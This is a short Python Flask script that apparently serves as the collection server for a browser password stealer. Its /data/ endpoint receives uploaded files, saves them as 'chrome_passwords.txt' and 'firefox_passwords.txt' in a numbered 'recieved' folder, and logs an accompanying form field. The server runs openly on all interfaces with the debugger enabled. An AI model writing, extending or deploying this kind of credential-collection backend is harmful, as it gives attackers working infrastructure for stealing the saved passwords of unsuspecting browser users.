from flask import Flask,render_template,request
import os, subprocess

app = Flask(__name__)

@app.route('/')
def form():
    return render_template("You can't access / directly. You can only send a POST request to /data/.")

@app.route('/data/', methods = ['POST', 'GET'])
def data():
    if request.method == 'GET':
        return f"You can't access /data directly. You can only send a POST request."
    if request.method == 'POST':
        percorsobase=subprocess.check_output('echo %cd%', shell=True).decode("utf-8")
        percorsobase=percorsobase[:-2]

        folders=[]
        for dirnames in os.listdir(percorsobase):
            folders.append(dirnames)

        nome='recieved_'+str(len(folders)-11)
        os.mkdir(nome)

        nomef1=nome+'/chrome_passwords.txt'
        nomef2=nome+'/firefox_passwords.txt'

        file = request.files['file1']
        file.save(nomef1)

        file = request.files['file2']
        file.save(nomef2)


        form_data = request.form
        a=form_data
        with open('logs.txt', 'a') as f:
            f.write(a['Field1_name'])
        return('got it')

app.run(host='0.0.0.0', debug=True)